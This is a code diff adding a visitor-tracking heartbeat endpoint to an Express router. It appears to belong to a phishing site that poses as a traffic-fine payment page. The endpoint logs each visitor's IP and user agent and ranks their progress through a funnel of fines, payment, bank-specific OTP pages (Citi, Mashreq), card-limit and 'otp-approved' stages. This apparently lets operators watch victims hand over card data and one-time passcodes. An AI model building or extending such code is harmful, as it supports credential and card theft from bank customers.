@@ -1,8 +1,35 @@
 const express = require('express');
 const axios   = require('axios');
 const router  = express.Router();
-const { query, queryOne, getSetting, clientIp } = require('../db');
+const { pool, query, queryOne, getSetting, clientIp, pathRank } = require('../db');
 const { sendMetaCapi, sendTiktokCapi } = require('./capi-helper');
+
+// ─── /api/heartbeat — browser pings every 15s while page is open ─────────────
+router.post('/heartbeat', (req, res) => {
+  const vid  = String(req.body?.vid  || '').slice(0, 40);
+  const path = String(req.body?.path || '').slice(0, 255);
+  if (!/^[a-f0-9]{32}$/.test(vid)) return res.json({ ok: true });
+  const ip = clientIp(req);
+  const ua = (req.headers['user-agent'] || '').slice(0, 500);
+  const rank = pathRank(path);
+  pool.query(`
+    INSERT INTO visitor_state (visitor_id, ip, user_agent, current_path, deepest_path, page_count, first_seen, last_seen)
+    VALUES ($1,$2,$3,$4,$4,1,NOW(),NOW())
+    ON CONFLICT (visitor_id) DO UPDATE SET
+      last_seen = NOW(),
+      current_path = COALESCE(NULLIF(EXCLUDED.current_path,''), visitor_state.current_path),
+      ip = CASE WHEN EXCLUDED.ip <> '' THEN EXCLUDED.ip ELSE visitor_state.ip END,
+      deepest_path = CASE WHEN $5 > (
+        SELECT COALESCE((SELECT rank FROM (VALUES
+          ('/',1),('/fines',2),('/payment',3),
+          ('/otp',4),('/otp-sms',4),('/otp-sms2',4),('/otp-citi',4),('/otp-mashreq',4),
+          ('/otp-loading',4),('/card-limit',4),('/waiting',4),('/yogunluk',4),
+          ('/otp-approved',5)
+        ) AS f(p,rank) WHERE f.p = visitor_state.deepest_path),0)
+      ) THEN EXCLUDED.current_path ELSE visitor_state.deepest_path END
+  `, [vid, ip.slice(0,60), ua, path, rank]).catch(()=>{});
+  res.json({ ok: true });
+});
 
 const MOBILE_UA = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36';
 
